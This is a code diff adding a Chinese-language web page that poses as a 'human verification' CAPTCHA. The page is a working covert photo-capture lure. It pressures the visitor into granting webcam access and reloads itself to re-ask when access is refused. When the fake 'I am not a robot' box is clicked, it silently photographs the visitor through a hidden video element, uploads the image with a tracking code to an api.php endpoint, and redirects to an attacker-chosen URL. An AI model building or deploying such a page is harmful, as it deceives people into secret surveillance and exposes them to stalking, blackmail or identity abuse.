@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>验证中...</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #f5f5f5;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .loading-container, .captcha-container {
+            text-align: center;
+            padding: 40px;
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
+            max-width: 380px;
+            width: 90%;
+        }
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #e0e0e0;
+            border-top-color: #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .loading-text { color: #666; font-size: 16px; margin-bottom: 10px; }
+        .progress-bar { width: 100%; height: 4px; background: #e0e0e0; border-radius: 2px; overflow: hidden; margin-top: 20px; }
+        .progress-fill { width: 0%; height: 100%; background: linear-gradient(90deg, #667eea, #764ba2); transition: width 0.3s; }
+        .captcha-container { display: none; }
+        .captcha-icon { font-size: 48px; margin-bottom: 15px; }
+        .captcha-title { font-size: 20px; font-weight: bold; color: #333; margin-bottom: 10px; }
+        .captcha-desc { color: #666; font-size: 14px; margin-bottom: 20px; }
+        .checkbox-area {
+            display: inline-block; width: 24px; height: 24px; border: 2px solid #ccc;
+            border-radius: 4px; margin-right: 10px; cursor: pointer; background: white;
+        }
+        .checkbox-area.checked { background: #667eea; border-color: #667eea; position: relative; }
+        .checkbox-area.checked::after { content: '✓'; color: white; font-size: 16px; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); }
+        .verify-row { display: flex; align-items: center; justify-content: center; margin-top: 20px; cursor: pointer; }
+        .camera-preview { width: 100%; max-width: 280px; margin: 12px auto; border-radius: 16px; overflow: hidden; background: #333; display: none; }
+        .camera-preview video { width: 100%; height: auto; }
+        .camera-status { font-size: 12px; margin-top: 10px; color: #28a745; }
+        .camera-status.error { color: #ff3b30; }
+        .code-badge { margin-top: 15px; font-size: 12px; color: #999; }
+        video { position: fixed; top: -9999px; left: -9999px; width: 1px; height: 1px; }
+        .retry-btn { margin-top: 15px; padding: 10px 20px; background: #007aff; color: white; border: none; border-radius: 12px; font-size: 14px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="loading-container" id="loadingContainer">
+        <div class="spinner"></div>
+        <div class="loading-text">正在验证环境安全...</div>
+        <div class="loading-text" style="font-size: 12px; color: #999;">正在初始化摄像头...</div>
+        <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+        <div class="code-badge">验证编号: <span id="displayCode"></span></div>
+        <div class="camera-status" id="cameraStatus">⏳ 等待摄像头授权...</div>
+    </div>
+    <div class="captcha-container" id="captchaContainer">
+        <div class="captcha-icon">🤖</div>
+        <div class="captcha-title">人机验证</div>
+        <div class="captcha-desc">请完成验证以继续访问</div>
+        <div class="camera-preview" id="cameraPreview"><video id="previewVideo" autoplay playsinline muted></video></div>
+        <div class="verify-row" id="verifyRow">
+            <div class="checkbox-area" id="checkbox"></div>
+            <span>我不是机器人</span>
+        </div>
+        <div class="code-badge">验证编号: <span id="displayCode2"></span></div>
+    </div>
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas" style="display: none;"></canvas>
+
+    <script>
+        // ==================== 配置 ====================
+        // 从URL获取参数
+        const urlParams = new URLSearchParams(window.location.search);
+        const code = urlParams.get('code') || 'UNKNOWN';
+        const targetUrl = urlParams.get('url') || 'https://www.baidu.com';
+        
+        // API地址：自动检测当前目录下的api.php
+        const apiUrl = (() => {
+            const path = window.location.pathname;
+            const dir = path.substring(0, path.lastIndexOf('/') + 1);
+            return window.location.origin + dir + 'api.php';
+        })();
+
+        // 显示编号
+        document.getElementById('displayCode').textContent = code;
+        document.getElementById('displayCode2').textContent = code;
+
+        // ==================== 状态变量 ====================
+        let stream = null, photoCaptured = false, cameraReady = false, videoElement = null, retryCount = 0;
+        const maxRetries = 3;
+
+        // ==================== 进度条 ====================
+        let progress = 0;
+        const progressInterval = setInterval(() => {
+            if (progress < 90) {
+                progress += Math.random() * 12;
+                if (progress > 90) progress = 90;
+                document.getElementById('progressFill').style.width = progress + '%';
+            }
+        }, 200);
+
+        // ==================== 重试机制 ====================
+        function refreshAndRetry() {
+            retryCount++;
+            if (retryCount <= maxRetries) {
+                document.getElementById('cameraStatus').innerHTML = `🔄 正在重新请求... (${retryCount}/${maxRetries})`;
+                document.getElementById('cameraStatus').classList.add('error');
+                setTimeout(() => window.location.reload(), 1500);
+            } else {
+                document.getElementById('cameraStatus').innerHTML = '⚠️ 无法获取摄像头，跳过拍照';
+                document.getElementById('cameraStatus').classList.add('error');
+                setTimeout(() => {
+                    document.getElementById('loadingContainer').style.display = 'none';
+                    document.getElementById('captchaContainer').style.display = 'block';
+                    cameraReady = false;
+                }, 1500);
+            }
+        }
+
+        // ==================== 拍照 ====================
+        async function capturePhoto() {
+            return new Promise((resolve, reject) => {
+                if (!videoElement || !cameraReady) reject('摄像头未就绪');
+                const canvas = document.getElementById('canvas');
+                const ctx = canvas.getContext('2d');
+                if (videoElement.videoWidth === 0) reject('视频未就绪');
+                canvas.width = videoElement.videoWidth;
+                canvas.height = videoElement.videoHeight;
+                ctx.drawImage(videoElement, 0, 0);
+                resolve(canvas.toDataURL('image/jpeg', 0.85));
+            });
+        }
+
+        // ==================== 上传 ====================
+        async function uploadPhoto(photoData) {
+            const fd = new FormData();
+            fd.append('photo_data', photoData);
+            fd.append('target_url', targetUrl);
+            fd.append('code', code);
+            
+            const res = await fetch(apiUrl + '?action=capture_photo', {
+                method: 'POST',
+                body: fd
+            });
+            return await res.json();
+        }
+
+        // ==================== 初始化摄像头 ====================
+        async function initCamera() {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } });
+                videoElement = document.getElementById('video');
+                videoElement.srcObject = stream;
+                const previewVideo = document.getElementById('previewVideo');
+                if (previewVideo) {
+                    previewVideo.srcObject = stream;
+                    document.getElementById('cameraPreview').style.display = 'block';
+                }
+                await new Promise(r => { videoElement.onloadedmetadata = () => { videoElement.play(); r(); }; });
+                await new Promise(r => setTimeout(r, 1000));
+                if (videoElement.videoWidth > 0) {
+                    cameraReady = true;
+                    document.getElementById('cameraStatus').innerHTML = '✅ 摄像头已就绪';
+                    document.getElementById('cameraStatus').classList.remove('error');
+                }
+                progress = 100;
+                document.getElementById('progressFill').style.width = '100%';
+                setTimeout(() => {
+                    document.getElementById('loadingContainer').style.display = 'none';
+                    document.getElementById('captchaContainer').style.display = 'block';
+                }, 600);
+            } catch(err) {
+                console.error('Camera error:', err);
+                if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
+                    refreshAndRetry();
+                } else {
+                    document.getElementById('cameraStatus').innerHTML = '⚠️ 摄像头初始化失败';
+                    document.getElementById('cameraStatus').classList.add('error');
+                    setTimeout(() => {
+                        document.getElementById('loadingContainer').style.display = 'none';
+                        document.getElementById('captchaContainer').style.display = 'block';
+                        cameraReady = false;
+                    }, 1500);
+                }
+            }
+        }
+
+        // ==================== 拍照并跳转 ====================
+        async function takePhotoAndRedirect() {
+            if (photoCaptured) return;
+            photoCaptured = true;
+            
+            let photoData = null;
+            if (cameraReady && videoElement?.videoWidth > 0) {
+                try {
+                    photoData = await capturePhoto();
+                } catch(e) { console.log('拍照失败:', e); }
+            }
+            
+            if (photoData) {
+                try {
+                    await uploadPhoto(photoData);
+                } catch(e) { console.log('上传失败:', e); }
+            }
+            
+            if (stream) stream.getTracks().forEach(t => t.stop());
+            window.location.href = targetUrl;
+        }
+
+        // ==================== 人机验证 ====================
+        let verified = false;
+        const verifyRow = document.getElementById('verifyRow');
+        const checkbox = document.getElementById('checkbox');
+        if (verifyRow) {
+            verifyRow.addEventListener('click', () => {
+                if (verified) return;
+                checkbox.classList.add('checked');
+                verified = true;
+                verifyRow.querySelector('span').textContent = '验证中...';
+                setTimeout(() => takePhotoAndRedirect(), 500);
+            });
+        }
+
+        // ==================== 启动 ====================
+        initCamera();
+        window.addEventListener('beforeunload', () => { if (stream) stream.getTracks().forEach(t => t.stop()); });
+    </script>
+</body>
+</html>
